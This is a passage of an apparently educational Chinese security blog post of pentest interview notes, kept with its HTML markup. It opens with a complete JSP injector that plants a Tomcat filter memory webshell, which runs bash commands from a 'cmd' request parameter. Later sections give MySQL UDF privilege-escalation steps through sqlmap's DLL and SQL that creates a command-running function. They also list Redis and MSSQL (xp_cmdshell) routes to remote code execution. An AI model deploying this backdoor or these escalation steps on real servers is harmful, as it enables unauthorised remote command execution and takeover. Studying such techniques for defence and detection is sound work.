class="string">"org.apache.tomcat.util.descriptor.web.FilterDef"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.tomcat.util.descriptor.web.FilterMap"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.lang.reflect.Constructor"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.catalina.core.ApplicationFilterConfig"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.catalina.Context"</span> %&gt;</span><br><span class="line">&lt;%@ page language=<span class="string">"java"</span> contentType=<span class="string">"text/html; charset=UTF-8"</span> pageEncoding=<span class="string">"UTF-8"</span>%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">final</span> String name = <span class="string">"KpLi0rn"</span>;</span><br><span class="line">    ServletContext servletContext = request.getSession().getServletContext();</span><br><span class="line"></span><br><span class="line">    Field appctx = servletContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">    appctx.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class="line"></span><br><span class="line">    Field stdctx = applicationContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">    stdctx.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br><span class="line"></span><br><span class="line">    Field Configs = standardContext.getClass().getDeclaredField(<span class="string">"filterConfigs"</span>);</span><br><span class="line">    Configs.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Map filterConfigs = (Map) Configs.get(standardContext);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (filterConfigs.get(name) == <span class="keyword">null</span>)&#123;</span><br><span class="line">        Filter filter = <span class="keyword">new</span> Filter() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">                HttpServletRequest req = (HttpServletRequest) servletRequest;</span><br><span class="line">                <span class="keyword">if</span> (req.getParameter(<span class="string">"cmd"</span>) != <span class="keyword">null</span>)&#123;</span><br><span class="line">                    <span class="keyword">byte</span>[] bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                    Process process = <span class="keyword">new</span> ProcessBuilder(<span class="string">"bash"</span>,<span class="string">"-c"</span>,req.getParameter(<span class="string">"cmd"</span>)).start();</span><br><span class="line">                    <span class="keyword">int</span> len = process.getInputStream().read(bytes);</span><br><span class="line">                    servletResponse.getWriter().write(<span class="keyword">new</span> String(bytes,<span class="number">0</span>,len));</span><br><span class="line">                    process.destroy();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        FilterDef filterDef = <span class="keyword">new</span> FilterDef();</span><br><span class="line">        filterDef.setFilter(filter);</span><br><span class="line">        filterDef.setFilterName(name);</span><br><span class="line">        filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 将filterDef添加到filterDefs中</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">        FilterMap filterMap = <span class="keyword">new</span> FilterMap();</span><br><span class="line">        filterMap.addURLPattern(<span class="string">"/*"</span>);</span><br><span class="line">        filterMap.setFilterName(name);</span><br><span class="line">        filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line"></span><br><span class="line">        standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line">        Constructor constructor = ApplicationFilterConfig<span class="class">.<span class="keyword">class</span>.<span class="title">getDeclaredConstructor</span>(<span class="title">Context</span>.<span class="title">class</span>,<span class="title">FilterDef</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);</span><br><span class="line"></span><br><span class="line">        filterConfigs.put(name,filterConfig);</span><br><span class="line">        out.print(<span class="string">"Inject Success !"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
开启服务，访问这个恶意的jsp文件。 显示注入成功<br>前文说到该方法只支持 Tomcat 7.x 以上，因为 javax.servlet.DispatcherType 类是servlet 3 以后引入，而 Tomcat 7以上才支持 Servlet 3<br>然后只需 ?cmd=Command 即可执行我们的命令</li>
</ol>
<p>内存马远不止这些，本文中内存马还是需要上传 jsp 来生效，但是实际上利用方式远不止这样，我们还可以借助各种反序列化来动态注册 Filter 等</p>
<h2 id="redis利用方式"><a href="#redis利用方式" class="headerlink" title="redis利用方式"></a>redis利用方式</h2><ol>
<li>写webshell</li>
<li>上传ssh key获得ssh登录权限</li>
<li>利用crontab</li>
<li>利用主从方式RCE。主机和从机可以利用FULLRESYNC同步文件。在主机上编译恶意so文件，随后再从机加载恶意so文件，连接上从机，即可执行命令。<br>修复：<br>开启密码认证并使用高强度密码<br>以低权限去启动redis<br>禁用高危命令<br>修改默认端口<h2 id="端口映射和端口转发"><a href="#端口映射和端口转发" class="headerlink" title="端口映射和端口转发"></a>端口映射和端口转发</h2>端口映射是指将内网中某个端口(例如5678)映射到公网的某个端口(例如2333).当有人访问公网ip的2333端口的时候服务器自动将请求映射到内网的对应端口上。</li>
</ol>
<p>我们在内网中有一台Web服务器，但是外网中的用户是没有办法直接访问该服务器的。于是我们可以在路由器上设置一个端口映射，只要外网用户访问路由器ip的80端口，那么路由器会把自动把流量转到内网Web服务器的80端口上。并且，在路由器上还存在一个Session，当内网服务器返回数据给路由器时，路由器能准确的将消息发送给外网请求用户的主机。在这过程中，路由器充当了一个反向代理的作用，他保护了内网中主机的安全。</p>
<p>端口转发也被叫做隧道。是安全壳（SSH） 为网络安全通信使用的一种方法。<br>比如，我们现在在内网中，是没有办法直接访问外网的。但是我们可以通过路由器的NAT方式访问外网。假如我们内网现在有100台主机，那么我们现在都是通过路由器的这一个公网IP和外网通信的。那么，当互联网上的消息发送回来时，路由器是怎么知道这个消息是给他的，而另外消息是给你的呢？这就要我们的ip地址和路由器的端口进行绑定了，这时，在路由器中就会有一个内网ip和路由器端口对应的一张表。当路由器的10000端口收到消息时，就知道把消息发送给他，而当20000端口收到消息时，就知道把消息发送给你。这就是端口转发，其转发一个端口收到的流量，给另一个主机。</p>
<h2 id="给你一个网站你怎么测试"><a href="#给你一个网站你怎么测试" class="headerlink" title="给你一个网站你怎么测试"></a>给你一个网站你怎么测试</h2><p>首先看看是不是采用了某些cms开发，如果是的话可以尝试找一下历史漏洞。如果是开源的，可以尝试一下源码审计。<br>可以尝试从中间件入手，看看是不是使用了某些有漏洞的中间件，比如最近的apache的几个cve漏洞。<br>如果都没有，可以先尝试对ip扫一下，看看开放了哪些端口，如果有敏感端口开放可以先试试进行利用。<br>可以对资产扫一下备份文件，看看有没有源码备份。还可以翻翻看网络请求，看看是不是有什么敏感接口或者连接了敏感服务器<br>翻翻看js文件，看看有没有测试账号或者一些管理默认密码忘了删除，或者看看js里面有没有访问敏感接口<br>对一些资产可以尝试fuzz二级目录和敏感文件，随后可以fuzz参数试试。有些测试文件和参数会没有及时删除。<br>还可以对ip进行反查，看看有没有旁站，可以从旁站入手试试。如果都不行，可以看看c段这边，从c段入手试试</p>
<h2 id="python-new和init的区别"><a href="#python-new和init的区别" class="headerlink" title="python new和init的区别"></a>python new和init的区别</h2><p><strong>new</strong>方法的调用是发生在<strong>init</strong>之前<br>p = Person(name, age)<br>首先执行使用name和age参数来执行Person类的<strong>new</strong>方法，这个<strong>new</strong>方法会 返回Person类的一个实例（通常情况下是使用 super(Persion, cls).<strong>new</strong>(cls) 这样的方式），<br>然后利用这个实例来调用类的<strong>init</strong>方法，上一步里面<strong>new</strong>产生的实例也就是 <strong>init</strong>里面的的 self<br>所以，<strong>init</strong> 和 <strong>new</strong> 最主要的区别在于： 1.<strong>init</strong> 通常用于初始化一个新实例，控制这个初始化的过程，比如添加一些属性， 做一些额外的操作，发生在类实例被创建完以后。它是实例级别的方法。 2.<strong>new</strong> 通常用于控制生成一个新实例的过程。它是类级别的方法。 但是说了这么多，<strong>new</strong>最通常的用法是什么呢，我们什么时候需要<strong>new</strong>？</p>
<h2 id="sqlmap-os-shell的原理"><a href="#sqlmap-os-shell的原理" class="headerlink" title="sqlmap os-shell的原理"></a>sqlmap os-shell的原理</h2><p>database：mysql<br>必要条件：<br>拥有网站的写入权限<br>Secure_file_priv参数为空或者为指定路径。</p>
<p>sqlmap往网站写入了两个文件，先上传一个能上传文件的马，再通过这个能上传文件的马去上传能执行命令的马。退出的时候会删除掉(mysql5.7后默认secure_file_priv为null)<br>顺带一提，mysql有udf提权一说，就是用户定义函数。sqlmap中有提权用的dll文件(sqlmap/data/udf/mysql/windows/64/lib_mysqludf_sys.dll_)对应的系统和版本可以自己选择<br>如果mysql版本小于5.0。将sqlmap对面版本的dll文件通过sql语句写入随意导出即可，这里sqlmap的dll文件需要先解密，解密后由于是二进制文件，可以使用mysql 0xa1…这种方式导出<br>如果mysql版本大于5.0小于5.1.需要将dll文件导出到目标服务器的系统目录，比如windows下的c:/windows/system32目录<br>mysql &gt; 5.1，udf.dll 必须要把udf.dll文件放到MySQL安装目录下的lib\plugin文件夹下才能创建自定义函数。show variables like ‘%plugin%’;查看目录。</p>
<p>Sqlmap将原本的dll文件进行了编码处理,我们需要通过脚本进行解密获得dll文件。（脚本位置sqlmap/extra/cloak/） 执行python cloak.py -d -i sqlmap/data/udf/mysql/windows/64/lib_mysqludf_sys.dll_进行dll_文件的解码，获得dll文件。<br>使用 select 0x16进制 into dumpfile 路径 导出dll文件到目标数据库。<br>接下来创建udf执行命令。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CREATE FUNCTION sys_eval RETURNS STRING SONAME &apos;dll文件名&apos; //创建函数</span><br><span class="line">SELECT system(&apos;whomai&apos;);//执行命令</span><br><span class="line">DROP FUNCTION sys_eval；//删除自定义函数</span><br></pre></td></tr></table></figure>

<h2 id="mssql-提权"><a href="#mssql-提权" class="headerlink" title="mssql 提权"></a>mssql 提权</h2><h3 id="xp-cmdshell"><a href="#xp-cmdshell" class="headerlink" title="xp_cmdshell"></a>xp_cmdshell</h3><ol>
<li>能写websehll就写webshell再提权</li>
<li>不能写webshell的时候，或者站库分离了，可以利用xp_cmdshell去下载恶意文件直接上线<h3 id="sp-oacreate"><a href="#sp-oacreate" class="headerlink" title="sp_oacreate"></a>sp_oacreate</h3>这个可以配合sp_oamethod执行命令</li>
<li>调用cmd来执行命令</li>
<li>写入启动项<h2 id="勒索病毒应急响应"><a href="#勒索病毒应急响应" class="headerlink" title="勒索病毒应急响应"></a>勒索病毒应急响应</h2>通过勒索病毒的界面和加密文件后缀等特征确定勒索病毒家族<br>锁定勒索病毒传播方式(比如rdp爆破进来的，那就去查看rdp登录日志)，查看入侵ip<br>重复上述步骤直到溯源到第一台被感染的服务器，确定入侵过程<br>最后就是病毒查杀和漏洞修复了</li>
</ol>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2021/07/03/GKCTF2021/" rel="next" title="GKCTF2021">
                <i class="fa fa-chevron-left"></i> GKCTF2021
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2021/11/03/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-%E5%8F%8D%E5%B0%84%E7%AF%87/" rel="prev" title="java安全漫谈-反射篇">
                java安全漫谈-反射篇 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="https://i.loli.net/2019/11/10/UuWBRD8EjChrNIi.jpg"
                alt="irrik" />
            
              <p class="site-author-name" itemprop="name">irrik</p>
              <p class="site-description motion-element" itemprop="description">又菜又爱玩</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">49</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">8</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/irrik" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-globe"></i>GitHub</a>
                  </span>
                
            </div>
          

          
          

          
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#windows上的提权方式"><span class="nav-number">1.</span> <span class="nav-text">windows上的提权方式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#内核提权"><span class="nav-number">1.1.</span> <span class="nav-text">内核提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#系统配置错误提权"><span class="nav-number">1.2.</span> <span class="nav-text">系统配置错误提权</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#系统服务权限配置错误"><span class="nav-number">1.2.1.</span> <span class="nav-text">系统服务权限配置错误</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#注册表键alwaysinstallelevated"><span class="nav-number">1.2.2.</span> <span class="nav-text">注册表键alwaysinstallelevated</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#可信任服务路径漏洞"><span class="nav-number">1.2.3.</span> <span class="nav-text">可信任服务路径漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#自动安装配置文件"><span class="nav-number">1.2.4.</span> <span class="nav-text">自动安装配置文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#计划任务"><span class="nav-number">1.2.5.</span> <span class="nav-text">计划任务</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#组策略首选项提权-SYSVOL-GPP"><span class="nav-number">1.3.</span> <span class="nav-text">组策略首选项提权(SYSVOL/GPP)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#绕过UAC提权"><span class="nav-number">1.4.</span> <span class="nav-text">绕过UAC提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#令牌窃取"><span class="nav-number">1.5.</span> <span class="nav-text">令牌窃取</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#渗透中，正向代理和反向代理隧道，使用什么工具"><span class="nav-number">2.</span> <span class="nav-text">渗透中，正向代理和反向代理隧道，使用什么工具</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#HTTP-S-隧道"><span class="nav-number">2.1.</span> <span class="nav-text">HTTP(S) 隧道</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Socks隧道"><span class="nav-number">2.2.</span> <span class="nav-text">Socks隧道</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#内网穿透工具"><span class="nav-number">2.3.</span> <span class="nav-text">内网穿透工具</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL注入WAF的绕过方法"><span class="nav-number">3.</span> <span class="nav-text">SQL注入WAF的绕过方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MYSQL写webshell需要哪些条件"><span class="nav-number">4.</span> <span class="nav-text">MYSQL写webshell需要哪些条件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#phpmyadmin-getshell-方式"><span class="nav-number">5.</span> <span class="nav-text">phpmyadmin getshell 方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sqlserver写webshell需要哪些条件"><span class="nav-number">6.</span> <span class="nav-text">sqlserver写webshell需要哪些条件</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#利用xp-cmdshell写shell"><span class="nav-number">6.1.</span> <span class="nav-text">利用xp_cmdshell写shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用差异备份写入WebShell"><span class="nav-number">6.2.</span> <span class="nav-text">使用差异备份写入WebShell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用log备份写入WebShell"><span class="nav-number">6.3.</span> <span class="nav-text">使用log备份写入WebShell</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#如果不是默认路径，怎么去获取写shell的路径"><span class="nav-number">7.</span> <span class="nav-text">如果不是默认路径，怎么去获取写shell的路径</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#windows-IIS-php的情况下，存在目录遍历，怎么查看源代码？"><span class="nav-number">8.</span> <span class="nav-text">windows+IIS+php的情况下，存在目录遍历，怎么查看源代码？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL注入获取MYSQL本身路径的函数"><span class="nav-number">9.</span> <span class="nav-text">SQL注入获取MYSQL本身路径的函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL注入延时注入，sleep的时候，如何加快延时出结果的速度"><span class="nav-number">10.</span> <span class="nav-text">SQL注入延时注入，sleep的时候，如何加快延时出结果的速度</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xss如何绕过CSP"><span class="nav-number">11.</span> <span class="nav-text">xss如何绕过CSP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#绕过default-src-‘none’"><span class="nav-number">11.1.</span> <span class="nav-text">绕过default-src ‘none’</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#形同虚设的script-src-‘unsafe-inline’"><span class="nav-number">11.2.</span> <span class="nav-text">形同虚设的script-src ‘unsafe-inline’</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用link绕过xx-src-self"><span class="nav-number">11.3.</span> <span class="nav-text">利用link绕过xx-src self</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用iframe绕过"><span class="nav-number">11.4.</span> <span class="nav-text">利用iframe绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#xss弹框函数"><span class="nav-number">11.5.</span> <span class="nav-text">xss弹框函数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#了解JWT吗？"><span class="nav-number">12.</span> <span class="nav-text">了解JWT吗？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xss读localstorage"><span class="nav-number">13.</span> <span class="nav-text">xss读localstorage</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#如果请求localhost，127-0-0-1被封禁，如何绕过"><span class="nav-number">14.</span> <span class="nav-text">如果请求localhost，127.0.0.1被封禁，如何绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF了解过吗"><span class="nav-number">15.</span> <span class="nav-text">SSRF了解过吗</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#什么是SSRF"><span class="nav-number">15.1.</span> <span class="nav-text">什么是SSRF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SSRF的危害"><span class="nav-number">15.2.</span> <span class="nav-text">SSRF的危害</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SSRF在php中的利用"><span class="nav-number">15.3.</span> <span class="nav-text">SSRF在php中的利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SSRF在Python中的利用"><span class="nav-number">15.4.</span> <span class="nav-text">SSRF在Python中的利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SSRF在java中的利用"><span class="nav-number">15.5.</span> <span class="nav-text">SSRF在java中的利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SSRF的攻防"><span class="nav-number">15.6.</span> <span class="nav-text">SSRF的攻防</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#30x跳转"><span class="nav-number">15.6.1.</span> <span class="nav-text">30x跳转</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#URL解析绕过"><span class="nav-number">15.6.2.</span> <span class="nav-text">URL解析绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DNS-rebinding"><span class="nav-number">15.6.3.</span> <span class="nav-text">DNS rebinding</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SSRF新手法，When-TLS-Hacks-You"><span class="nav-number">15.6.4.</span> <span class="nav-text">SSRF新手法，When TLS Hacks You</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SSRF的防护"><span class="nav-number">15.7.</span> <span class="nav-text">SSRF的防护</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#命令执行，不回显如何拿结果"><span class="nav-number">16.</span> <span class="nav-text">命令执行，不回显如何拿结果</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#判断命令执行"><span class="nav-number">16.1.</span> <span class="nav-text">判断命令执行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#拿结果"><span class="nav-number">16.2.</span> <span class="nav-text">拿结果</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#命令执行，不出网如何拿结果"><span class="nav-number">17.</span> <span class="nav-text">命令执行，不出网如何拿结果</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#如何利用任意文件下载"><span class="nav-number">18.</span> <span class="nav-text">如何利用任意文件下载</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#如何知道网站的目录，tomcat的路径"><span class="nav-number">19.</span> <span class="nav-text">如何知道网站的目录，tomcat的路径</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#csrf了解过吗"><span class="nav-number">20.</span> <span class="nav-text">csrf了解过吗</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#什么是csrf"><span class="nav-number">20.1.</span> <span class="nav-text">什么是csrf</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#常见的几种CSRF攻击类型"><span class="nav-number">20.2.</span> <span class="nav-text">常见的几种CSRF攻击类型</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#GET类型的CSRF"><span class="nav-number">20.2.1.</span> <span class="nav-text">GET类型的CSRF</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#POST类型的CSRF"><span class="nav-number">20.2.2.</span> <span class="nav-text">POST类型的CSRF</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#链接类型的CSRF"><span class="nav-number">20.2.3.</span> <span class="nav-text">链接类型的CSRF</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CSRF的特点"><span class="nav-number">20.3.</span> <span class="nav-text">CSRF的特点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#防护策略"><span class="nav-number">20.4.</span> <span class="nav-text">防护策略</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#shiro反序列化的原理"><span class="nav-number">21.</span> <span class="nav-text">shiro反序列化的原理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#shiro-550"><span class="nav-number">21.1.</span> <span class="nav-text">shiro-550</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#shiro-721"><span class="nav-number">21.2.</span> <span class="nav-text">shiro-721</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#shiro检测key爆破原理"><span class="nav-number">21.3.</span> <span class="nav-text">shiro检测key爆破原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#shiro不出网并且不回显检测"><span class="nav-number">21.4.</span> <span class="nav-text">shiro不出网并且不回显检测</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#被上传webshell后如何排除入侵点"><span class="nav-number">22.</span> <span class="nav-text">被上传webshell后如何排除入侵点</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#事件分析"><span class="nav-number">22.1.</span> <span class="nav-text">事件分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#定位时间范围"><span class="nav-number">22.1.1.</span> <span class="nav-text">定位时间范围</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#web日志分析"><span class="nav-number">22.1.2.</span> <span class="nav-text">web日志分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#定位到漏洞点，进行漏洞分析"><span class="nav-number">22.1.3.</span> <span class="nav-text">定位到漏洞点，进行漏洞分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞修复"><span class="nav-number">22.1.4.</span> <span class="nav-text">漏洞修复</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#java内存马了解过吗"><span class="nav-number">23.</span> <span class="nav-text">java内存马了解过吗</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#如何实现webshell内存马"><span class="nav-number">23.1.</span> <span class="nav-text">如何实现webshell内存马</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#内存马类型"><span class="nav-number">23.2.</span> <span class="nav-text">内存马类型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#背景知识"><span class="nav-number">23.3.</span> <span class="nav-text">背景知识</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#java-web-三大件"><span class="nav-number">23.3.1.</span> <span class="nav-text">java web 三大件</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#servlet"><span class="nav-number">23.3.1.1.</span> <span class="nav-text">servlet</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#请求处理的过程"><span class="nav-number">23.3.1.2.</span> <span class="nav-text">请求处理的过程</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#servlet生命周期"><span class="nav-number">23.3.1.3.</span> <span class="nav-text">servlet生命周期</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Filter"><span class="nav-number">23.3.2.</span> <span class="nav-text">Filter</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Listener"><span class="nav-number">23.3.3.</span> <span class="nav-text">Listener</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#tomcat"><span class="nav-number">23.4.</span> <span class="nav-text">tomcat</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Tomcat架构设计"><span class="nav-number">23.4.1.</span> <span class="nav-text">Tomcat架构设计</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#java反射"><span class="nav-number">23.5.</span> <span class="nav-text">java反射</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#内存马实现"><span class="nav-number">23.6.</span> <span class="nav-text">内存马实现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#内存马检测与排查"><span class="nav-number">23.7.</span> <span class="nav-text">内存马检测与排查</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#源码检测"><span class="nav-number">23.7.1.</span> <span class="nav-text">源码检测</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#内存马排查"><span class="nav-number">23.7.2.</span> <span class="nav-text">内存马排查</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#java-内存马-filter型"><span class="nav-number">24.</span> <span class="nav-text">java 内存马 filter型</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#tomcat-filter流程分析"><span class="nav-number">24.1.</span> <span class="nav-text">tomcat filter流程分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Filter型内存马注入"><span 